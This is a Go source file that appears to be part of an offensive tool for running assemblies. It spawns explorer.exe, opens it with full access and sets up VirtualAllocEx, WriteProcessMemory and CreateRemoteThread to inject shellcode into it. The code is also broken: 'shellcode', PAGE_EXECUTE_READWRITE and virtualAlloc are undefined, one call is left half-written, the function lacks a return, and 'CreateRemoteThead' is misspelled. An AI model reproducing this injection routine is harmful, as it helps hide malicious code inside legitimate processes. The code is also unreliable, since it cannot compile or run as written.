package assembly

import (
	"bytes"
	"fmt"
	"os/exec"
	"strconv"
	"syscall"

	"../execute"
)

const (
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
)

var (
	kernel32      	   *syscall.DLL
	virtualAllocEx	   *syscall.Proc
	writeProcMem  	   *syscall.Proc
	createRemoteThread *syscall.Proc
)

func runAssembly(assembly string, clrpath string, timeout int) ([]byte, string, string) {
	proc := exec.Command("explorer.exe")
	var stdoutBuf, stderrBuf bytes.Buffer
	proc.Stdout = &stdoutBuf
	proc.Stderr = &stderrBuf

	err := proc.Start()
	if err != nil {
		return []byte(fmt.Sprintf("Encountered an error starting the process: %q", err.Error())), execute.ERROR_STATUS, execute.ERROR_PID
	}
	pid := proc.Process.Pid
	procHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return []byte(fmt.Sprintf("Could not get process handle: %q", err.Error())), execute.ERROR_STATUS, strconv.Itoa(pid)
	}

	baseClrAddress, err := virtualAllocEx.Call(uintptr(procHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	address, _, err := virtualAlloc.Call(0, )
}

func checkIfAvailable() bool {
	var kernel32Err, vAllocExErr, writeProcMemErr, remoteThreadErr error
	kernel32, kernel32Err = syscall.LoadDLL("kernel32.dll")
	virtualAlloc, vAllocExErr = kernel32.FindProc("VirtualAllocEx")
	writeProcMem, writeProcMemErr = kernel32.FindProc("WriteProcessMemory")
	createRemoteThread, remoteThreadErr = kernel32.FindProc("CreateRemoteThead")
	if kernel32Err == nil && vAllocExErr == nil && writeProcMemErr == nil && remoteThreadErr == nil {
		return true
	}
	return false
}